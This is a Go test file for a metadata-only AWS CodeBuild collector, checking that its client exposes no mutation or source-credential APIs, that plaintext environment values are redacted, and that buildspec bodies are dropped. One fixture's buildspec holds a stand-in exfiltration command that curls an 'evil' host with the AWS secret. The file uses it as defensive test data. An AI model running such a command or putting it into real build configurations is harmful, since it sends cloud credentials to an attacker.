// SPDX-License-Identifier: MIT
// Copyright (c) 2025-2026 eshu-hq

package awssdk

import (
	"context"
	"fmt"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	cbtypes "github.com/aws/aws-sdk-go-v2/service/codebuild/types"

	"github.com/eshu-hq/eshu/go/internal/collector/awscloud/services/codebuild"
	"github.com/eshu-hq/eshu/go/internal/redact"
)

// TestAPIClientInterfaceExcludesMutationCredentialAndLogAPIs proves the AWS SDK
// surface this adapter accepts never lists a CodeBuild mutation, build
// data-plane, source-credential, or log-content API as a callable method. It is
// the reflective guard the issue requires first: a maintainer cannot widen the
// metadata-only contract to reach mutation, credential, or log-content APIs
// without failing this test.
func TestAPIClientInterfaceExcludesMutationCredentialAndLogAPIs(t *testing.T) {
	clientType := reflect.TypeOf((*apiClient)(nil)).Elem()
	forbidden := []string{
		// Project mutation.
		"CreateProject",
		"UpdateProject",
		"DeleteProject",
		"UpdateProjectVisibility",
		// Report-group mutation.
		"CreateReportGroup",
		"UpdateReportGroup",
		"DeleteReportGroup",
		"DeleteReport",
		// Build data-plane mutation.
		"StartBuild",
		"StopBuild",
		"RetryBuild",
		"BatchDeleteBuilds",
		"StartBuildBatch",
		"StopBuildBatch",
		"RetryBuildBatch",
		// Source-credential APIs (carry tokens).
		"ImportSourceCredentials",
		"DeleteSourceCredentials",
		"ListSourceCredentials",
		// Webhook mutation.
		"CreateWebhook",
		"UpdateWebhook",
		"DeleteWebhook",
		// Log-content / coverage / test-case readers excluded from the metadata
		// scanner.
		"DescribeCodeCoverages",
		"DescribeTestCases",
		"GetResourcePolicy",
		"PutResourcePolicy",
	}
	for _, name := range forbidden {
		if _, ok := clientType.MethodByName(name); ok {
			t.Fatalf("apiClient exposes forbidden method %q; CodeBuild SDK adapter must stay metadata-only", name)
		}
	}
}

func testKey(t *testing.T) redact.Key {
	t.Helper()
	key, err := redact.NewKey([]byte("codebuild-redaction-key"))
	if err != nil {
		t.Fatalf("NewKey() error = %v", err)
	}
	return key
}

// TestClientListProjectsRedactsPlaintextAndDropsBuildspec is the issue's core
// proof: a project with a PLAINTEXT environment value and a buildspec body must
// surface neither raw. The PLAINTEXT value becomes a redaction marker and the
// buildspec body has nowhere to land because the scanner-owned ProjectSource
// has no buildspec field.
func TestClientListProjectsRedactsPlaintextAndDropsBuildspec(t *testing.T) {
	const plaintextValue = "super-secret-token-value"
	const buildspecBody = "version: 0.2\nphases:\n  build:\n    commands:\n      - curl https://evil/$AWS_SECRET"
	api := &fakeCodeBuildAPI{
		projectNames: []string{"checkout-build"},
		projectInfo: map[string]cbtypes.Project{
			"checkout-build": {
				Name:        aws.String("checkout-build"),
				Arn:         aws.String("arn:aws:codebuild:us-east-1:123456789012:project/checkout-build"),
				ServiceRole: aws.String("arn:aws:iam::123456789012:role/CodeBuildServiceRole"),
				Source: &cbtypes.ProjectSource{
					Type:      cbtypes.SourceTypeGithub,
					Location:  aws.String("https://github.com/example/checkout.git"),
					Buildspec: aws.String(buildspecBody),
				},
				Environment: &cbtypes.ProjectEnvironment{
					Type:        cbtypes.EnvironmentTypeLinuxContainer,
					Image:       aws.String("aws/codebuild/standard:7.0"),
					ComputeType: cbtypes.ComputeTypeBuildGeneral1Small,
					EnvironmentVariables: []cbtypes.EnvironmentVariable{
						{
							Name:  aws.String("SECRET_TOKEN"),
							Value: aws.String(plaintextValue),
							Type:  cbtypes.EnvironmentVariableTypePlaintext,
						},
						{
							Name:  aws.String("DB_SECRET"),
							Value: aws.String("arn:aws:secretsmanager:us-east-1:123456789012:secret:db-AbCdEf"),
							Type:  cbtypes.EnvironmentVariableTypeSecretsManager,
						},
					},
				},
				Created: aws.Time(testTime),
			},
		},
	}
	client := newTestClient(api, testKey(t))

	projects, err := client.ListProjects(context.Background())
	if err != nil {
		t.Fatalf("ListProjects() error = %v", err)
	}
	if len(projects) != 1 {
		t.Fatalf("projects = %d, want 1", len(projects))
	}
	project := projects[0]

	// The PLAINTEXT value must be a redaction marker, never the raw value.
	plain := project.Environment.EnvironmentVariables[0]
	if plain.Name != "SECRET_TOKEN" || plain.Type != "PLAINTEXT" {
		t.Fatalf("plaintext variable name/type = %#v", plain)
	}
	marker, _ := plain.ValueMarker["marker"].(string)
	if marker == "" {
		t.Fatalf("plaintext env value not redacted: %#v", plain.ValueMarker)
	}
	if marker == plaintextValue {
		t.Fatalf("plaintext env value leaked raw value")
	}
	if plain.Reference != "" {
		t.Fatalf("plaintext variable retained a reference %q, want none", plain.Reference)
	}

	// The SECRETS_MANAGER reference is kept (a resource reference, not a value).
	secretVar := project.Environment.EnvironmentVariables[1]
	if secretVar.Reference != "arn:aws:secretsmanager:us-east-1:123456789012:secret:db-AbCdEf" {
		t.Fatalf("secrets-manager reference = %q", secretVar.Reference)
	}
	if len(secretVar.ValueMarker) != 0 {
		t.Fatalf("secrets-manager variable redacted unexpectedly: %#v", secretVar.ValueMarker)
	}

	// The buildspec body must not appear anywhere in the project record.
	if leaks := projectLeaksString(project, buildspecBody); leaks != "" {
		t.Fatalf("project leaked buildspec content: %q", leaks)
	}
	if leaks := projectLeaksString(project, plaintextValue); leaks != "" {
		t.Fatalf("project leaked plaintext env value: %q", leaks)
	}
}

func TestClientListProjectsChunksBatchGetByAWSLimit(t *testing.T) {
	const total = awsBatchGetProjectsLimit + 5
	names := make([]string, 0, total)
	info := make(map[string]cbtypes.Project, total)
	for i := 0; i < total; i++ {
		name := fmt.Sprintf("project-%03d", i)
		names = append(names, name)
		info[name] = cbtypes.Project{
			Name: aws.String(name),
			Arn:  aws.String("arn:aws:codebuild:us-east-1:123456789012:project/" + name),
		}
	}
	api := &fakeCodeBuildAPI{projectNames: names, projectInfo: info}
	client := newTestClient(api, testKey(t))

	projects, err := client.ListProjects(context.Background())
	if err != nil {
		t.Fatalf("ListProjects() error = %v", err)
	}
	if len(projects) != total {
		t.Fatalf("projects = %d, want %d (BatchGet must chunk by the AWS 100-name cap)", len(projects), total)
	}
}

func TestClientListProjectsSurfacesNotFound(t *testing.T) {
	api := &fakeCodeBuildAPI{
		projectNames:     []string{"checkout-build"},
		projectInfo:      map[string]cbtypes.Project{},
		projectsNotFound: []string{"checkout-build"},
	}
	client := newTestClient(api, testKey(t))

	_, err := client.ListProjects(context.Background())
	if err == nil {
		t.Fatalf("ListProjects() error = nil, want not-found surfaced")
	}
	if !strings.Contains(err.Error(), "checkout-build") {
		t.Fatalf("ListProjects() error = %v, want it to name the unresolved project", err)
	}
}

func TestClientListReportGroupsSurfacesNotFound(t *testing.T) {
	api := &fakeCodeBuildAPI{
		reportGroupARNs:      []string{"arn:aws:codebuild:us-east-1:123456789012:report-group/missing"},
		reportGroupInfo:      map[string]cbtypes.ReportGroup{},
		reportGroupsNotFound: []string{"arn:aws:codebuild:us-east-1:123456789012:report-group/missing"},
	}
	client := newTestClient(api, testKey(t))

	_, err := client.ListReportGroups(context.Background())
	if err == nil {
		t.Fatalf("ListReportGroups() error = nil, want not-found surfaced")
	}
}

// TestClientListRecentBuildsMapsStartAndEndTime proves the adapter copies the
// build identity, status, and the StartTime/EndTime window it is responsible
// for. Duration is computed in the scanner observation layer (durationSeconds
// in observations.go), not here, so this test asserts only what mapBuild owns;
// duration coverage lives in the scanner test (scanner_test.go).
func TestClientListRecentBuildsMapsStartAndEndTime(t *testing.T) {
	endTime := testTime.Add(5 * time.Minute)
	api := &fakeCodeBuildAPI{
		buildIDs: []string{"checkout-build:abcd"},
		buildInfo: map[string]cbtypes.Build{
			"checkout-build:abcd": {
				Id:            aws.String("checkout-build:abcd"),
				Arn:           aws.String("arn:aws:codebuild:us-east-1:123456789012:build/checkout-build:abcd"),
				ProjectName:   aws.String("checkout-build"),
				BuildStatus:   cbtypes.StatusTypeSucceeded,
				BuildComplete: true,
				StartTime:     aws.Time(testTime),
				EndTime:       aws.Time(endTime),
			},
		},
	}
	client := newTestClient(api, testKey(t))

	builds, err := client.ListRecentBuilds(context.Background())
	if err != nil {
		t.Fatalf("ListRecentBuilds() error = %v", err)
	}
	if len(builds) != 1 {
		t.Fatalf("builds = %d, want 1", len(builds))
	}
	if builds[0].Status != "SUCCEEDED" {
		t.Fatalf("build status = %q, want SUCCEEDED", builds[0].Status)
	}
	if !builds[0].StartTime.Equal(testTime.UTC()) {
		t.Fatalf("build start time = %v, want %v", builds[0].StartTime, testTime.UTC())
	}
	if !builds[0].EndTime.Equal(endTime.UTC()) {
		t.Fatalf("build end time = %v, want %v", builds[0].EndTime, endTime.UTC())
	}
}

// TestClientListRecentBuildsSurfacesNotFound proves the adapter fails the scan
// when BatchGetBuilds reports unresolved build IDs rather than silently
// dropping them, and that the error names the unresolved build id so an
// operator can act on it.
func TestClientListRecentBuildsSurfacesNotFound(t *testing.T) {
	const missingID = "checkout-build:missing"
	api := &fakeCodeBuildAPI{
		buildIDs:       []string{missingID},
		buildInfo:      map[string]cbtypes.Build{},
		buildsNotFound: []string{missingID},
	}
	client := newTestClient(api, testKey(t))

	_, err := client.ListRecentBuilds(context.Background())
	if err == nil {
		t.Fatalf("ListRecentBuilds() error = nil, want not-found surfaced")
	}
	if !strings.Contains(err.Error(), missingID) {
		t.Fatalf("ListRecentBuilds() error = %v, want it to name the unresolved build id %q", err, missingID)
	}
}

func TestClientListReportGroupsMapsExportConfig(t *testing.T) {
	api := &fakeCodeBuildAPI{
		reportGroupARNs: []string{"arn:aws:codebuild:us-east-1:123456789012:report-group/checkout-reports"},
		reportGroupInfo: map[string]cbtypes.ReportGroup{
			"arn:aws:codebuild:us-east-1:123456789012:report-group/checkout-reports": {
				Name:   aws.String("checkout-reports"),
				Arn:    aws.String("arn:aws:codebuild:us-east-1:123456789012:report-group/checkout-reports"),
				Type:   cbtypes.ReportTypeTest,
				Status: cbtypes.ReportGroupStatusTypeActive,
				ExportConfig: &cbtypes.ReportExportConfig{
					ExportConfigType: cbtypes.ReportExportConfigTypeS3,
					S3Destination: &cbtypes.S3ReportExportConfig{
						Bucket: aws.String("checkout-reports-bucket"),
					},
				},
			},
		},
	}
	client := newTestClient(api, testKey(t))

	groups, err := client.ListReportGroups(context.Background())
	if err != nil {
		t.Fatalf("ListReportGroups() error = %v", err)
	}
	if len(groups) != 1 {
		t.Fatalf("report groups = %d, want 1", len(groups))
	}
	if groups[0].ExportType != "S3" || groups[0].ExportS3Bucket != "checkout-reports-bucket" {
		t.Fatalf("export config = %#v", groups[0])
	}
}

// projectLeaksString reports the first string field anywhere in the project
// record that contains the needle, proving forbidden content did not survive
// mapping. It walks nested structs, slices, and maps.
func projectLeaksString(project codebuild.Project, needle string) string {
	needle = strings.ToLower(needle)
	var found string
	var walk func(value reflect.Value)
	walk = func(value reflect.Value) {
		if found != "" {
			return
		}
		switch value.Kind() {
		case reflect.String:
			if strings.Contains(strings.ToLower(value.String()), needle) {
				found = value.String()
			}
		case reflect.Pointer, reflect.Interface:
			if !value.IsNil() {
				walk(value.Elem())
			}
		case reflect.Struct:
			for i := 0; i < value.NumField(); i++ {
				walk(value.Field(i))
			}
		case reflect.Slice, reflect.Array:
			for i := 0; i < value.Len(); i++ {
				walk(value.Index(i))
			}
		case reflect.Map:
			for _, key := range value.MapKeys() {
				walk(value.MapIndex(key))
			}
		}
	}
	walk(reflect.ValueOf(project))
	return found
}
